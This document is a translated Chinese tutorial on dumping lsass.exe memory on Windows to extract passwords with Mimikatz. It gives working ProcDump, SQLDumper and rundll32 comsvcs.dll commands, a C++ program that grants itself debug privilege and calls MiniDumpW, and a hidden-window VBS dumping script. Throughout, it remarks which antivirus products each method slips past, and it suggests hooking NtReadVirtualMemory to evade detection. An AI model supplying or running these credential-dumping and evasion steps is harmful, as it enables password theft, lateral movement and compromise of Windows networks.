# 转储 lsass 的方法原理与实现

##### 译文声明
本文是翻译文章，译文仅供参考。具体内容表达及含义以原文为准。

`lsass.exe`（本地安全授权子系统服务）进程空间中存储着机器的域、本地用户名和密码等重要信息。如果获取了本地高权限，用户便可以访问 `LSASS` 进程内存，从而导出内部数据（如密码），用于横向移动和权限提升。然而，传统的方法容易被反病毒软件监测和拦截。以下是几种转储 `lsass` 的方法及其原理：

## 1. 使用微软签名文件

### ProcDump
ProcDump 是微软签名的合法二进制文件，可用于转储进程内存。可以在微软官方文档中下载 ProcDump 文件。

**使用方法：**
- 以管理员身份运行：
  ```shell
  Procdump64.exe -accepteula -ma lsass.exe lsass.dmp
  ```
- 将生成的 `lsass.dmp` 文件复制到 Mimikatz 目录下，并执行以下命令：
  ```shell
  mimikatz # sekurlsa::minidump lsass.dmp
  Switch to MINIDUMP
  mimikatz # sekurlsa::logonPasswords full
  ```

**原理：**
`lsass.exe` 是 Windows 系统的安全机制，主要用于本地安全和登录策略。当用户登录系统并输入密码后，密码会存储在 `lsass.exe` 内存中。通过 `wdigest` 和 `tspkg` 模块调用后，密码经过可逆算法加密并存储在内存中。Mimikatz 正是通过对 `lsass.exe` 内存进行逆向计算来获取明文密码。

**注意事项：**
- 尽管火绒不查，但在实际操作中可能会遇到 ProcDump 被杀的情况，可能是由于签名有效期过期。
- 360 不论签名时间戳是否有效，都会拦截 `Procdump.exe`。

## 2. 任务管理器

**使用方法：**
- 打开任务管理器，选中目标进程 `lsass.exe`，右键点击“创建转储文件”，文件保存为 `%temp%\lsass.dmp`。

**缺点：**
- 该方法相对较为鸡肋，不推荐使用。

## 3. SQLDumper

`SQLDumper.exe` 包含在 Microsoft SQL 和 Office 中，可生成完整的转储文件。

**使用方法：**
- 查看 `lsass.exe` 的 PID 号：
  ```shell
  tasklist /svc | findstr lsass.exe
  ```
- 导出 `mdmp` 文件：
  ```shell
  Sqldumper.exe <ProcessID> 0 0x01100
  ```
- 将生成的 `mdmp` 文件下载到本地，并使用相同的操作系统打开：
  ```shell
  mimikatz.exe "sekurlsa::minidump SQLDmpr0001.mdmp" "sekurlsa::logonPasswords full" exit
  ```

**优点：**
- 文件被认为是安全的，火绒和 360 都不会将其视为恶意程序。

**缺点：**
- 在转储 `lsass.exe` 进程时可能会出现一些问题。

## 4. Comsvcs.dll

每个 Windows 系统中都包含 `comsvcs.dll` 文件，可以使用 `Rundll32` 执行其导出函数 `MiniDump` 实现进程的完全转储。

**使用方法：**
- 文件位于 `C:\windows\system32\comsvcs.dll`。
- 使用以下命令调用 `MiniDump` 实现转储 `lsass.exe` 进程：
  ```shell
  rundll32 C:\windows\system32\comsvcs.dll MiniDump "dump.bin full"
  ```

**原理：**
- 通过 API `MiniDumpWriteDump()` 获取进程的 `dmp` 文件。
- 某些安全产品已经开始拦截这种行为，可以通过用户模式下的 API hook，使用跳转 (JMP) 命令将 `NtReadVirtualMemory()` 的前 5 个字节修改为指向另一个内存地址来绕过检测。

**注意事项：**
- 在 CMD 下无法使用 `comsvcs.dll` 的 `MiniDump` 转储内存文件，因为需要开启 `SeDebugPrivilege` 权限。在 PowerShell 中默认开启了该权限。
- 可以使用以下命令在 PowerShell 中执行：
  ```powershell
  powershell -c "rundll32 C:\windows\system32\comsvcs.dll, MiniDump 508 C:\86189\lsass.dmp full"
  ```

**权限提升：**
- 可以使用 `RtlAdjustPrivilege` 函数来提升权限，该函数封装在 `NtDll.dll` 中。
- 具体实现可以参考相关文章：[https://bbs.pediy.com/thread-76552.htm](https://bbs.pediy.com/thread-76552.htm)

**示例代码：**
```cpp
// BypassHashdump.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#define UNICODE // 使用 UNICODE 对应 main 函数就是 wmain
#include <windows.h>
#include <winternl.h>

typedef HRESULT(WINAPI* _MiniDumpW)(DWORD arg1, DWORD arg2, PWCHAR cmdline);
typedef NTSTATUS(WINAPI* _RtlAdjustPrivilege)(ULONG Privilege, BOOL Enable, BOOL CurrentThread, PULONG Enabled);

int wmain(int argc, wchar_t* argv[]) {
    HRESULT hr;
    _MiniDumpW MiniDumpW;
    _RtlAdjustPrivilege RtlAdjustPrivilege;
    ULONG t;

    // 从 comsvcs.dll 中获得 MiniDumpW 导出函数
    MiniDumpW = (_MiniDumpW)GetProcAddress(LoadLibrary(L"comsvcs.dll"), "MiniDumpW");
    // 从 Ntdll 中获得 RtlAdjustPrivilege 导出函数用于提权
    RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(LoadLibrary(L"ntdll.dll"), "RtlAdjustPrivilege");

    if (MiniDumpW == NULL) {
        printf("Unable to resolve COMSVCS!MiniDumpW.\n");
        return 0;
    }
    if (RtlAdjustPrivilege == NULL) {
        printf("Unable to resolve RtlAdjustPrivilege.\n");
        return 0;
    }

    // 获取 SeDebugPrivilege，最后一个参数不要设置为 NULL
    RtlAdjustPrivilege(20, TRUE, FALSE, &t);
    printf("Invoking COMSVCS!MiniDumpW(\"%ws\")\n", argv[1]);
    // 转储 lsass.exe
    MiniDumpW(0, 0, argv[1]);
    printf("OK!\n");
    return 0;
}
```

**VBS 脚本示例：**
```vbscript
Option Explicit
Const SW_HIDE = 0

If (WScript.Arguments.Count <> 1) Then
    WScript.StdOut.WriteLine("procdump - Copyright (c) 2019 odzhan")
    WScript.StdOut.WriteLine("Usage: procdump ")
    WScript.Quit
Else
    Dim fso, svc, list, proc, startup, cfg, pid, str, cmd, query, dmp
    ' 获取进程 ID 或名称
    pid = WScript.Arguments(0)
    ' 以调试权限连接
    Set fso  = CreateObject("Scripting.FileSystemObject")
    Set svc  = GetObject("WINMGMTS:{impersonationLevel=impersonate, (Debug)}")

    If (Not IsNumeric(pid)) Then
        query = "Name"
    Else
        query = "ProcessId"
    End If

    ' 尝试查找进程
    Set list = svc.ExecQuery("SELECT * From Win32_Process Where " & _
      query & " = '" & pid & "'")
    If (list.Count = 0) Then
        WScript.StdOut.WriteLine("Can't find active process : " & pid)
        WScript.Quit()
    End If

    For Each proc in list
        pid = proc.ProcessId
        str = proc.Name
        Exit For
    Next

    dmp = fso.GetBaseName(str) & ".bin"
    ' 如果 dump 文件已存在，尝试删除
    If (fso.FileExists(dmp)) Then
        WScript.StdOut.WriteLine("Removing " & dmp)
        fso.DeleteFile(dmp)
    End If

    WScript.StdOut.WriteLine("Attempting to dump memory from " & _
      str & ":" & pid & " to " & dmp)
    Set proc       = svc.Get("Win32_Process")
    Set startup    = svc.Get("Win32_ProcessStartup")
    Set cfg        = startup.SpawnInstance_
    cfg.ShowWindow = SW_HIDE
    cmd = "rundll32 C:\windows\system32\comsvcs.dll, MiniDump " & _
          pid & " " & fso.GetAbsolutePathName(".") & "\" & _
          dmp & " full"
    Call proc.Create (cmd, null, cfg, pid)
    ' 等待一秒
    Wscript.Sleep(1000)
    If (fso.FileExists(dmp)) Then
        WScript.StdOut.WriteLine("Memory saved to " & dmp)
    Else
        WScript.StdOut.WriteLine("Failed to create dump file.")
    End If
End If
```

以上方法均未被火绒和 360 拦截，并且 VT 免杀率尚可。希望这些方法能帮助你更好地理解和实现 `lsass` 的转储。